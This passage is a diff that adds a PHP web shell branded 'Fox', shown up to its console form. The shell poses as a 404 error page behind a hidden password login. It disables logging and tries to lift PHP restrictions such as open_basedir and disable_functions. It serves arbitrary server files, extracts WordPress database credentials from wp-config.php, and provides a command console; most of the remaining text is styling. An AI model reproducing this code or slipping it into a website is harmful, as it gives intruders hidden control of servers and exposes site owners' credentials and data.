@@ -1,0 +1,1005 @@
+<?php error_reporting(0);session_start();unset($_SESSION['console_cwd'],$_SESSION['cwd']);$baseRoot=normalizePath($_SERVER['DOCUMENT_ROOT']?? '/');$console_cwd=isset($_REQUEST['cwd'])?normalizePath($_REQUEST['cwd']):(isset($_GET['path'])?normalizePath($_GET['path']):$baseRoot);if(!isAllowedByOpenBaseDir($console_cwd)){$console_cwd=$baseRoot;}set_time_limit(0);@clearstatcache();@ini_set('error_log',null);@ini_set('log_errors',0);@ini_set('max_execution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors',0);$default_action='FilesMan';$default_use_ajax=true;$default_charset='UTF-8';$foxp='34df534db663da8ee9e0c05372e14841';function login_shell(){echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>';if(isset($_GET['fox'])){echo"\n<br><br><br><br><br><br><br><br><br><center>\n\n        <form method=\"post\"><center>\n                <input type=\"password\" name=\"fox\" placeholder=\"masukin cok\" autocomplete=\"off\" required/>\n                <button type=\"submit\">Login</button>\n                </form></div></center>";}exit;}if(isset($_GET['logout'])){unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);$_SESSION=[];if(ini_get('session.use_cookies')){$p=session_get_cookie_params();setcookie(session_name(),'',time()-42000,$p['path'],$p['domain'],$p['secure'],$p['httponly']);}session_destroy();header('Location: '.$_SERVER['SCRIPT_NAME']);exit;}if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])){if(empty($foxp)||(isset($_POST['fox'])&&(md5($_POST['fox'])==$foxp))){$_SESSION[md5($_SERVER['HTTP_HOST'])]=true;session_regenerate_id(true);}else{login_shell();}}session_write_close();function normalizePath($path){if(empty($path))return getcwd();$path=str_replace('\\','/',$path);$path=preg_replace('#/+#','/',$path);if($path==='/')return '/';return rtrim($path,'/');}function isAllowedByOpenBaseDir($path){$openBaseDir=ini_get('open_basedir');if(empty($openBaseDir))return true;$allowedDirs=explode(PATH_SEPARATOR,$openBaseDir);$realPath=@realpath($path)?:$path;foreach($allowedDirs as $dir){$dir=trim($dir);if($dir==='')continue;$dir=rtrim($dir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;if(strpos($realPath,$dir)===0){return true;}}return true;}@ini_set('open_basedir',null);@ini_set('safe_mode',false);@ini_set('disable_functions','');@ini_set('memory_limit','512M');@ini_set('upload_max_filesize','100M');@ini_set('post_max_size','100M');class AlfaCURL{public $headers;public $user_agent;public $compression;public $cookie_file;public $proxy;public $path;public $ssl=true;public $curl_status=true;function __construct($cookies=false,$compression='gzip',$proxy=''){if(!extension_loaded('curl')){$this->curl_status=false;return false;}$this->headers[]='Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';$this->headers[]='Connection: Keep-Alive';$this->headers[]='Content-type: application/x-www-form-urlencoded;charset=UTF-8';$this->user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36';$this->path=sys_get_temp_dir().'/fox_cookies.txt';$this->compression=$compression;$this->proxy=$proxy;$this->cookies=$cookies;if($this->cookies)$this->cookie($this->path);}function cookie($cookie_file){if(file_exists($cookie_file)){$this->cookie_file=$cookie_file;}else{@fopen($cookie_file,'w')or die($this->error('The cookie file could not be opened.'));$this->cookie_file=$cookie_file;@fclose($this->cookie_file);}}function Send($url,$method="get",$data=""){if(!$this->curl_status)return false;$process=curl_init($url);curl_setopt($process,CURLOPT_HTTPHEADER,$this->headers);curl_setopt($process,CURLOPT_HEADER,0);curl_setopt($process,CURLOPT_USERAGENT,$this->user_agent);curl_setopt($process,CURLOPT_RETURNTRANSFER,1);curl_setopt($process,CURLOPT_ENCODING,$this->compression);curl_setopt($process,CURLOPT_TIMEOUT,30);curl_setopt($process,CURLOPT_FOLLOWLOCATION,true);if($this->ssl){curl_setopt($process,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($process,CURLOPT_SSL_VERIFYHOST,false);}if($this->cookies){curl_setopt($process,CURLOPT_COOKIEFILE,$this->path);curl_setopt($process,CURLOPT_COOKIEJAR,$this->path);}if($this->proxy){curl_setopt($process,CURLOPT_PROXY,$this->proxy);}if($method=='post'){curl_setopt($process,CURLOPT_POSTFIELDS,$data);curl_setopt($process,CURLOPT_POST,1);}$return=@curl_exec($process);curl_close($process);return $return;}function error($error){echo"<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$error</div></center>";die;}}if(isset($_GET['viewfile'])&&isset($_GET['ajax'])&&$_GET['ajax']=='1'){$filepath=$_GET['viewfile'];if(file_exists($filepath)&&is_readable($filepath)){echo file_get_contents($filepath);}else{echo "File tidak dapat dibaca.";}exit();}if(isset($_POST['action'])&&$_POST['action']=='get_wp_config'){$path=rtrim($_POST['wp_path'],'/').'/wp-config.php';header('Content-Type: application/json');if(!file_exists($path)||!is_readable($path)){echo json_encode(array('error'=>'wp-config.php not found or not readable'));exit();}$config_content=file_get_contents($path);$data=array();$patterns=array('host'=>"/define[ ]*\([ ]*['\"]DB_HOST['\"][ ]*,[ ]*['\"]([^'\"]*)['\"][ ]*\)[ ]*;/",'dbname'=>"/define[ ]*\([ ]*['\"]DB_NAME['\"][ ]*,[ ]*['\"]([^'\"]*)['\"][ ]*\)[ ]*;/",'user'=>"/define[ ]*\([ ]*['\"]DB_USER['\"][ ]*,[ ]*['\"]([^'\"]*)['\"][ ]*\)[ ]*;/",'password'=>"/define[ ]*\([ ]*['\"]DB_PASSWORD['\"][ ]*,[ ]*['\"]([^'\"]*)['\"][ ]*\)[ ]*;/",'prefix'=>'/\$table_prefix[ ]*=[ ]*[\'"]([^\'"]*)[\'"][ ]*;/');foreach($patterns as $key=>$pattern){if(preg_match($pattern,$config_content,$matches)){$data[$key]=$matches[1];}}echo json_encode($data);exit();} ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>𝙁𝙤𝙭🦊</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="fox">
+    <meta name="viewport" content="fox-team" />
+    <meta name="description" content="Error Page">
+    <meta property="og:description" content="Error Page">
+    <meta property="og:image" content="#">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <link rel="shortcut icon" type="image/x-icon" href="https://ampnyapunyaku.top/icon/fox.ico" sizes="162x162" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Carrois+Gothic&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Bungee+Outline&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</head>
+<body>
+<style>
+.header,.nav-buttons-center,body{position:relative}.system-info,body,tbody td,th{color:#e8f4ff}input,textarea,th{font-weight:500}a,tbody td a{color:#94d3ff;text-decoration:none;text-shadow:0 0 8px rgba(148,211,255,.3)}a:hover,tbody td a:hover{color:#60a5fa;text-shadow:0 0 12px rgba(96,165,250,.6)}body,input,select{backdrop-filter:blur(10px)}.pencet:hover,input:focus{transform:translateY(-2px)}.fox-text,tbody td:not(:first-child){text-align:center}.btn,tbody td{font-weight:400}.btn,.modal-btn,a,a:hover,body,button:hover,button:link,select:after{cursor:pointer}.btn,.card,.extension-status,.fa,.form-control,.info-card,.info-item,.modal-btn,.modal-container,.modal-overlay,.pencet,a,input,select,tbody td,tbody td a,textarea{transition:.3s}*,body,html{max-width:100vw!important}pre,table{overflow-x:auto!important}table,table tbody,table thead{width:100%!important;table-layout:fixed!important}.btn,button,td,th{text-overflow:ellipsis!important}body{font-family:Orbitron,Roboto,sans-serif;background:linear-gradient(135deg,#0c1929 0,#1a2332 25%,#0f1b2e 50%,#162639 75%,#0c1929 100%);background-size:400% 400%;animation:15s infinite gradientShift;min-height:100vh}.system-info,textarea{font-family:"JetBrains Mono",monospace;line-height:1.5}body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 20% 30%,rgba(59,130,246,.15) 0,transparent 40%),radial-gradient(circle at 80% 70%,rgba(139,92,246,.1) 0,transparent 40%),radial-gradient(circle at 40% 80%,rgba(6,182,212,.1) 0,transparent 40%);pointer-events:none;z-index:-1}@keyframes gradientShift{0%,100%{background-position:0 50%}50%{background-position:100% 50%}}.directory-listing-table{background:rgba(15,27,46,.85);backdrop-filter:blur(20px);border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:1.5rem;box-shadow:0 8px 32px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.1),0 0 0 1px rgba(59,130,246,.1);position:relative;overflow:hidden;z-index:1}.header,input:focus,textarea:focus{background:rgba(15,27,46,.9)}.directory-listing-table::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(59,130,246,.5),transparent)}.header{margin:20px;backdrop-filter:blur(25px);border:1px solid rgba(59,130,246,.4);border-radius:16px;padding:20px 30px;box-shadow:0 12px 40px rgba(0,0,0,.5),inset 0 1px 0 rgba(255,255,255,.15);z-index:1000}.header-content{display:flex;justify-content:space-between;align-items:flex-start;gap:20px;margin-bottom:20px}.system-info{flex:0 0 70%;font-size:12px}.header-logo{flex:0 0 12%;display:flex;justify-content:center;align-items:center}.header-logo img{max-width:120px;height:auto}.header-nav{display:flex;justify-content:center;width:100%}.nav-buttons-center{display:flex;justify-content:center;width:100%;z-index:10001}.nav-buttons-center .btn-group{display:flex;flex-wrap:wrap;justify-content:center;gap:8px}.info-item,.modal-header{justify-content:space-between;display:flex}.nav-buttons-center .btn{font-size:14px;padding:10px 16px;font-weight:500;border-radius:10px;transition:.3s;min-width:120px}.nav-buttons-center .btn:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 8px 25px rgba(59,130,246,.3)}th{border-top:1px solid rgba(59,130,246,.3);border-bottom:1px solid rgba(59,130,246,.3);background:rgba(59,130,246,.1);text-shadow:0 0 10px rgba(59,130,246,.5)}tbody td{font-size:13px;padding:.75rem;font-family:"JetBrains Mono",Roboto,monospace;background:rgba(15,27,46,1);border-bottom:1px solid rgba(59,130,246,.1)}tbody td:nth-child(1){width:25%;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:left}tbody td:nth-child(2),tbody td:nth-child(4){width:12%;text-align:center}tbody td:nth-child(3){width:18%;text-align:center}tbody td:nth-child(5){width:13%;text-align:center}tbody td:nth-child(6){width:20%;text-align:center}tbody tr:hover td{background:rgba(59,130,246,.15);box-shadow:inset 0 0 20px rgba(59,130,246,.1)}body::-webkit-scrollbar{width:12px}body::-webkit-scrollbar-track{background:rgba(15,27,46,.8);border-radius:6px}body::-webkit-scrollbar-thumb{background:linear-gradient(180deg,rgba(59,130,246,.6),rgba(139,92,246,.6));border-radius:6px;border:2px solid rgba(15,27,46,.5)}body::-webkit-scrollbar-thumb:hover{background:linear-gradient(180deg,rgba(59,130,246,.8),rgba(139,92,246,.8))}input{margin-bottom:4px;background:rgba(15,27,46,.8);outline:0;padding:12px 16px;font-size:15px;color:#fff;text-shadow:0 0 8px rgba(255,255,255,.5);box-shadow:inset 0 2px 8px rgba(0,0,0,.3),0 4px 20px rgba(59,130,246,.1),inset 0 1px 0 rgba(255,255,255,.1)}.pencet,textarea{background:rgba(15,27,46,.8);backdrop-filter:blur(15px)}input::placeholder{color:rgba(255,255,255,.8)!important;font-weight:500;text-shadow:0 1px 2px rgba(0,0,0,.8);opacity:1}input:focus{border-color:rgba(59,130,246,.7);color:#fff;box-shadow:inset 0 2px 8px rgba(0,0,0,.3),0 0 25px rgba(59,130,246,.4),inset 0 1px 0 rgba(255,255,255,.15)}input:focus::placeholder{color:rgba(255,255,255,.6)!important;text-shadow:0 1px 3px rgba(0,0,0,.9)}textarea{max-height:100%;padding:16px;resize:none;overflow:auto;color:#fff;box-shadow:inset 0 4px 16px rgba(0,0,0,.4),0 8px 32px rgba(59,130,246,.15),inset 0 1px 0 rgba(255,255,255,.1);font-size:14px;text-shadow:0 0 8px rgba(255,255,255,.3)}textarea::placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important;opacity:1!important}.btn:hover,textarea:focus{border-color:rgba(59,130,246,.6);color:#fff}textarea:focus{box-shadow:inset 0 4px 16px rgba(0,0,0,.4),0 0 30px rgba(59,130,246,.3),inset 0 1px 0 rgba(255,255,255,.15)}textarea:focus::placeholder{color:rgba(255,255,255,.6)!important;text-shadow:0 1px 3px rgba(0,0,0,.9)}.badge-action-edit,button.badge-action-chmod,button.badge-action-delete,button.badge-action-download,button.badge-action-edit,button.badge-action-rename,button.badge-action-tanggal,button.badge-action-unzip{position:relative!important;overflow:visible!important}.badge-action-edit:hover::after{content:"Edit-file"}.badge-action-rename:hover::after{content:"Rename"}.badge-action-chmod:hover::after{content:"Chmod"}.badge-action-delete:hover::after{content:"Delete"}.badge-action-tanggal:hover::after{content:"ChDate"}.badge-action-unzip:hover::after{content:"UnZip"}.badge-action-download:hover::after{content:"Download"}.badge-action-chmod:hover::after,.badge-action-delete:hover::after,.badge-action-download:hover::after,.badge-action-edit:hover::after,.badge-action-rename:hover::after,.badge-action-tanggal:hover::after,.badge-action-unzip:hover::after{position:absolute!important;top:20%!important;left:50%!important;transform:translate(-50%,-50%)!important;color:#fff!important;padding:5px 8px!important;font-size:8px!important;border:1px solid rgba(59,130,246,.8)!important;border-radius:6px!important;z-index:2147483647!important;display:block!important;white-space:nowrap!important;font-weight:500!important;backdrop-filter:blur(10px)!important;box-shadow:0 8px 25px rgba(0,0,0,.5)!important;pointer-events:none!important}@keyframes tooltipFadeIn{0%{opacity:0;transform:translateX(-50%) translateY(-10px) scale(.8)}100%{opacity:1;transform:translateX(-50%) translateY(0) scale(1)}}textarea::-webkit-scrollbar{width:10px}textarea::-webkit-scrollbar-track{background:rgba(15,27,46,.5);border-radius:5px}textarea::-webkit-scrollbar-thumb{background:linear-gradient(180deg,rgba(59,130,246,.7),rgba(139,92,246,.7));border-radius:5px;border:1px solid rgba(59,130,246,.3)}textarea::-webkit-scrollbar-thumb:hover{background:linear-gradient(180deg,rgba(59,130,246,.9),rgba(139,92,246,.9))}.btn,.fox-text,.pencet,select{color:#e8f4ff}a:hover{transform:scale(1.02)}input,select,textarea{border:1px solid rgba(59,130,246,.3);border-radius:12px}select{background:rgba(15,27,46,.7);padding:8px 12px;box-shadow:inset 0 2px 8px rgba(0,0,0,.3),0 4px 20px rgba(59,130,246,.1)}.pencet{border:1px solid rgba(59,130,246,.4);box-shadow:0 6px 20px rgba(0,0,0,.3),inset 0 1px 0 rgba(255,255,255,.1)}.pencet:hover{background:rgba(59,130,246,.2);box-shadow:0 8px 25px rgba(59,130,246,.3),inset 0 1px 0 rgba(255,255,255,.15)}.crot{border-radius:50%;padding:15px;width:100px;height:100px;background:rgba(15,27,46,.6);backdrop-filter:blur(10px);border:2px solid rgba(59,130,246,.3);box-shadow:0 8px 32px rgba(0,0,0,.4)}.fox-text{font-size:19pt;font-family:Orbitron,Roboto,sans-serif;background:linear-gradient(200deg,rgba(59,130,246,.8) 25%,rgba(139,92,246,.8) 50%,rgba(6,182,212,.8) 75%,rgba(59,130,246,.8) 100%);background-size:200% auto;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:2s linear infinite animate;text-shadow:0 0 20px rgba(59,130,246,.5)}@keyframes animate{to{background-position:200% center}}.btn{background:rgba(15,27,46,.7);backdrop-filter:blur(15px);border:1px solid rgba(59,130,246,.4);padding:8px 16px;border-radius:10px;font-family:Orbitron,sans-serif;text-shadow:0 0 8px rgba(232,244,255,.3);box-shadow:0 4px 15px rgba(0,0,0,.3),inset 0 1px 0 rgba(255,255,255,.1)}.btn-outline-danger,.btn-outline-info,.btn-outline-light,.btn-outline-primary,.btn-outline-secondary,.btn-outline-warning{background:rgba(15,27,46,.6)}.disabled-functions,.info-value{font-family:"JetBrains Mono",monospace}.form-control,.form-select{font-weight:500!important;backdrop-filter:blur(10px)}.btn:hover{background:rgba(59,130,246,.25);box-shadow:0 8px 25px rgba(59,130,246,.4),inset 0 1px 0 rgba(255,255,255,.15);transform:translateY(-2px) scale(1.02);text-shadow:0 0 12px rgba(255,255,255,.5)}.btn-outline-secondary{border-color:rgba(139,92,246,.4)}.btn-outline-secondary:hover{background:rgba(139,92,246,.25);border-color:rgba(139,92,246,.6)}.btn-outline-light{border-color:rgba(6,182,212,.4)}.btn-outline-light:hover{background:rgba(6,182,212,.25);border-color:rgba(6,182,212,.6)}.btn-outline-info{border-color:rgba(59,130,246,.4)}.btn-outline-info:hover{background:rgba(59,130,246,.25);border-color:rgba(59,130,246,.6)}.btn-outline-primary{border-color:rgba(99,102,241,.4)}.btn-outline-primary:hover{background:rgba(99,102,241,.25);border-color:rgba(99,102,241,.6)}.btn-outline-danger{border-color:rgba(239,68,68,.4)}.btn-outline-danger:hover{background:rgba(239,68,68,.25);border-color:rgba(239,68,68,.6)}.btn-outline-warning{border-color:rgba(245,158,11,.4)}.form-control,.form-select,pre{background:rgba(15,27,46,.8)!important}.btn-outline-warning:hover{background:rgba(245,158,11,.25);border-color:rgba(245,158,11,.6)}.form-control{border:1px solid rgba(59,130,246,.4)!important;color:#fff!important;border-radius:10px!important;box-shadow:inset 0 2px 8px rgba(0,0,0,.3),0 4px 20px rgba(59,130,246,.1)!important}.form-control::placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important;opacity:1!important}.form-control:focus{background:rgba(15,27,46,.9)!important;border-color:rgba(59,130,246,.7)!important;color:#fff!important;box-shadow:inset 0 2px 8px rgba(0,0,0,.3),0 0 25px rgba(59,130,246,.4)!important}.form-control:focus::placeholder{color:rgba(255,255,255,.6)!important;text-shadow:0 1px 3px rgba(0,0,0,.9)!important}.form-select{border:1px solid rgba(59,130,246,.4)!important;color:#fff!important;border-radius:10px!important;text-shadow:0 0 8px rgba(255,255,255,.3)!important}.input-group-text{background:rgba(59,130,246,.3)!important;backdrop-filter:blur(10px);border:1px solid rgba(59,130,246,.5)!important;color:#fff!important;border-radius:10px!important;font-weight:600;text-shadow:0 0 10px rgba(255,255,255,.5)}.card,.directory-listing-table[style*="border: 1px solid red"],.info-card,pre{backdrop-filter:blur(15px)}.fa{text-shadow:0 0 8px currentColor;filter:drop-shadow(0 0 4px currentColor)}.fa:hover{filter:drop-shadow(0 0 8px currentColor) brightness(1.2);transform:scale(1.1)}pre{border:1px solid rgba(59,130,246,.3);border-radius:12px;box-shadow:inset 0 4px 16px rgba(0,0,0,.4),0 8px 32px rgba(59,130,246,.15);padding:20px;white-space:pre-wrap!important}.btn,button,table,td,th{white-space:nowrap!important}font[color=lime]{color:#22c55e!important;text-shadow:0 0 8px rgba(34,197,94,.5)}font[color=red]{color:#ef4444!important;text-shadow:0 0 8px rgba(239,68,68,.5)}font[color=orange]{color:#f59e0b!important;text-shadow:0 0 8px rgba(245,158,11,.5)}font[color=aqua]{color:#06b6d4!important;text-shadow:0 0 8px rgba(6,182,212,.5)}.info-card h5,.modal-title{color:#e8f4ff;text-shadow:0 0 10px rgba(59,130,246,.5)}.modal-header{padding:20px 30px;border-bottom:1px solid rgba(59,130,246,.3);align-items:center;background:rgba(59,130,246,.1)}.modal-title{font-size:20px;font-weight:600}.modal-controls{display:flex;gap:10px}.modal-btn{background:rgba(15,27,46,.8);border:1px solid rgba(59,130,246,.4);color:#e8f4ff;padding:8px 12px;border-radius:8px;font-size:14px}.card-title,.info-card h5{font-size:18px;font-weight:600}.modal-btn:hover{background:rgba(59,130,246,.3);box-shadow:0 4px 15px rgba(59,130,246,.3)}.modal-body{padding:30px}.card{background:rgba(15,27,46,.7)!important;border:1px solid rgba(59,130,246,.3)!important;border-radius:12px!important;overflow:hidden}.card:hover{background:rgba(15,27,46,.9)!important;border-color:rgba(59,130,246,.5)!important;box-shadow:0 8px 25px rgba(59,130,246,.2)!important;transform:translateY(-3px)}.card-body{padding:20px!important}.card-title{color:#e8f4ff!important;margin-bottom:10px;text-shadow:0 0 8px rgba(232,244,255,.3)}.card-text{color:#94d3ff!important;font-size:14px;margin-bottom:15px;opacity:.9}.modal-container::-webkit-scrollbar{width:8px}.modal-container::-webkit-scrollbar-track{background:rgba(15,27,46,.5);border-radius:4px}.modal-container::-webkit-scrollbar-thumb{background:linear-gradient(180deg,rgba(59,130,246,.6),rgba(139,92,246,.6));border-radius:4px}.info-card{background:rgba(15,27,46,.8);border:1px solid rgba(59,130,246,.3);border-radius:12px;padding:20px;margin-bottom:20px;box-shadow:0 8px 25px rgba(0,0,0,.3),inset 0 1px 0 rgba(255,255,255,.1)}.info-card:hover{border-color:rgba(59,130,246,.5);box-shadow:0 12px 30px rgba(59,130,246,.2),inset 0 1px 0 rgba(255,255,255,.15);transform:translateY(-2px)}.info-card h5{margin-bottom:15px;border-bottom:1px solid rgba(59,130,246,.3);padding-bottom:10px}.info-item{align-items:center;padding:8px 0;border-bottom:1px solid rgba(59,130,246,.1)}.info-item:hover{background:rgba(59,130,246,.1);border-radius:6px;padding-left:10px;padding-right:10px}.info-label{color:#94d3ff;font-weight:500;font-size:14px;text-shadow:0 0 5px rgba(148,211,255,.3)}.info-value{color:#e8f4ff;font-size:13px;font-weight:400;max-width:60%;text-align:right;word-break:break-all}.extension-status{display:flex;justify-content:space-between;align-items:center;padding:10px 15px;background:rgba(15,27,46,.6);border:1px solid rgba(59,130,246,.2);border-radius:8px;margin-bottom:8px}.extension-status:hover{background:rgba(59,130,246,.15);border-color:rgba(59,130,246,.4);transform:scale(1.02)}.ext-label{color:#94d3ff;font-weight:500;font-size:14px}.ext-status{font-weight:600;font-size:13px;text-shadow:0 0 8px currentColor}.current-name,.date-preset h6,.permission-preset h6{color:#e8f4ff;margin-bottom:10px;font-weight:600;text-shadow:0 0 8px rgba(232,244,255,.3)}.disabled-functions{background:rgba(0,0,0,.4);border:1px solid rgba(59,130,246,.2);border-radius:8px;padding:15px;font-size:13px;line-height:1.6;max-height:150px;overflow-y:auto}.ext-status font[color="#22c55e"]{animation:2s infinite pulse-green}.ext-status font[color="#ef4444"]{animation:2s infinite pulse-red}@keyframes pulse-green{0%,100%{opacity:1}50%{opacity:.7}}@keyframes pulse-red{0%,100%{opacity:1}50%{opacity:.6}}#info-modal .modal-container{max-width:1200px}.info-item .fa{margin-right:8px;color:rgba(59,130,246,.8)}.current-name{background:rgba(59,130,246,.15);padding:15px 20px;border-radius:10px;border:1px solid rgba(59,130,246,.3)}.current-date,.current-perms{background:rgba(139,92,246,.15);padding:10px 15px;border-radius:8px;border:1px solid rgba(139,92,246,.3);color:#e8f4ff;font-size:14px;margin-top:10px}.date-preset,.permission-preset{background:rgba(15,27,46,.6);border:1px solid rgba(59,130,246,.3);border-radius:10px;padding:15px;margin-bottom:15px}.date-preset .btn,.permission-preset .btn{margin:3px;font-size:12px;padding:5px 10px}.btn-outline-success{background:rgba(15,27,46,.6);border-color:rgba(34,197,94,.4);color:#22c55e}.btn-outline-success:hover{background:rgba(34,197,94,.25);border-color:rgba(34,197,94,.6);color:#fff;box-shadow:0 8px 25px rgba(34,197,94,.3)}#edit-textarea{background:rgba(0,0,0,.5)!important;border:1px solid rgba(59,130,246,.4)!important;color:#fff!important;font-weight:500!important}input::-webkit-input-placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important}input::-moz-placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important;opacity:1!important}input:-ms-input-placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important}textarea::-webkit-input-placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important}textarea::-moz-placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important;opacity:1!important}textarea:-ms-input-placeholder{color:rgba(255,255,255,.85)!important;font-weight:500!important;text-shadow:0 1px 2px rgba(0,0,0,.8)!important}.directory-listing-table[style*="border: 1px solid lime"]{border:1px solid rgba(34,197,94,.6)!important;background:rgba(34,197,94,.1)!important;backdrop-filter:blur(15px);box-shadow:0 8px 25px rgba(34,197,94,.2),inset 0 1px 0 rgba(255,255,255,.1);animation:1s ease-in-out successPulse}.directory-listing-table[style*="border: 1px solid red"]{border:1px solid rgba(239,68,68,.6)!important;background:rgba(239,68,68,.1)!important;box-shadow:0 8px 25px rgba(239,68,68,.2),inset 0 1px 0 rgba(255,255,255,.1);animation:.5s ease-in-out errorShake}@keyframes successPulse{0%{transform:scale(.95);opacity:.5}50%{transform:scale(1.02);opacity:1}100%{transform:scale(1);opacity:1}}@keyframes errorShake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}#console-input{font-family:"JetBrains Mono",monospace!important;font-size:14px!important}.modal-overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;padding:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);z-index:1000001!important;opacity:0;visibility:hidden;overscroll-behavior:contain}.modal-overlay.active{display:flex!important;opacity:1!important;visibility:visible!important}.modal-overlay .modal-container{position:relative!important;margin:0!important;width:min(1000px,calc(100% - 32px));max-height:85vh;overflow:auto!important;background:rgba(15,27,46,.95);border:1px solid rgba(59,130,246,.4);border-radius:20px;box-shadow:0 25px 50px rgba(0,0,0,.6);z-index:1}body.modal-open,html.modal-open{overflow:hidden!important;height:100%;overscroll-behavior:none}*{box-sizing:border-box!important}body,html{overflow-x:hidden!important;width:100%!important}div,form,input,pre,table,td,textarea,th,tr{word-wrap:break-word!important;max-width:100%!important;box-sizing:border-box!important;overflow-wrap:break-word!important}table{display:block!important}table tbody,table thead{display:table!important}td,th{overflow:hidden!important;max-width:0!important}td:first-child{white-space:normal!important;word-break:break-word!important;overflow-wrap:break-word!important}embed,iframe,img,object,video{max-width:100%!important;height:auto!important}#console-modal .modal-container{max-width:1000px;max-height:80vh}@media (max-width:768px){.modal-overlay .modal-container{width:100%;max-height:85vh}#edit-modal .modal-container{width:95%!important;max-height:90vh!important}#console-modal .modal-container{width:95%;max-height:75vh}}.dropdown-menu{background:rgba(15,27,46,.95)!important;backdrop-filter:blur(15px)!important;border:1px solid rgba(59,130,246,.4)!important;border-radius:10px!important;box-shadow:0 8px 25px rgba(0,0,0,.4)!important}.btn-group.dropdown,.dropdown{z-index:999998!important}.dropdown{position:relative!important}.dropdown-item{color:#e8f4ff!important;font-weight:500!important;padding:8px 16px!important;transition:.3s!important;text-decoration:none!important}.dropdown-item:hover{background:rgba(59,130,246,.25)!important;color:#fff!important;text-shadow:0 0 8px rgba(255,255,255,.5)!important}.dropdown-item i{margin-right:8px!important;color:rgba(59,130,246,.8)!important}.mu-plugin-card{background:#f8f9fa;border:1px solid #dee2e6;border-radius:6px;margin-bottom:1rem}.mu-plugin-card .card-body{padding:.75rem 1rem}.mu-plugin-checkbox{width:14px;height:14px;cursor:pointer;margin-top:.1rem}.mu-plugin-checkbox:checked{background-color:#22c55e;border-color:#22c55e}.mu-plugin-checkbox:focus{box-shadow:0 0 0 .1rem rgba(34,197,94,.25)}.mu-plugin-label{color:#374151;font-size:13px;font-weight:500;cursor:pointer;margin-left:.4rem;display:flex;align-items:center;gap:.4rem;line-height:1}.mu-plugin-desc{font-size:11px;color:#6b7280;margin-top:.2rem;margin-left:1.8rem;line-height:1.3}.mu-plugin-icon{width:12px;height:12px;flex-shrink:0;color:#6b7280}input.mu-plugin-checkbox:checked~label.mu-plugin-label,input.mu-plugin-checkbox:checked~label.mu-plugin-label .mu-plugin-icon{color:#22c55e}.form-check{display:flex;flex-direction:column;align-items:flex-start}.mu-plugin-content{display:flex;align-items:center;width:100%}.wp-tool-checkbox.small{padding:9px}
+</style>
+<!-- Console Modal -->
+<div id="console-modal" class="modal-overlay">
+    <div class="modal-container">
+        <div class="modal-header">
+            <h3 class="modal-title"><i class="fa fa-terminal"></i> Console Terminal</h3>
+            <div class="modal-controls">
+                <button class="modal-btn" onclick="minimizeConsole()">
+                    <i class="fa fa-minus"></i> Minimize
+                </button>
+                <button class="modal-btn" onclick="closeModal('console')">
+                    <i class="fa fa-times"></i> Close
+                </button>
+            </div>
+        </div>
+        <div class="modal-body">
+            <form method="POST" action="?path=<?php echo isset($_GET['path'])?normalizePath($_GET['path']):normalizePath(getcwd()); ?>">
+                <div class="input-group mb-3">
+                    <span class="input-group-text"><i class="fa fa-terminal"></i></span>
+                    <input type="text" name="cmd" id="console-input" class="form-control" placeholder="Command..." autocomplete="off">
+                    <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($console_cwd,ENT_QUOTES); ?>">
+                    <button type="submit" class="btn btn-outline-light" name="submit_cmd">Execute</button>
+                </div>
+            </form>
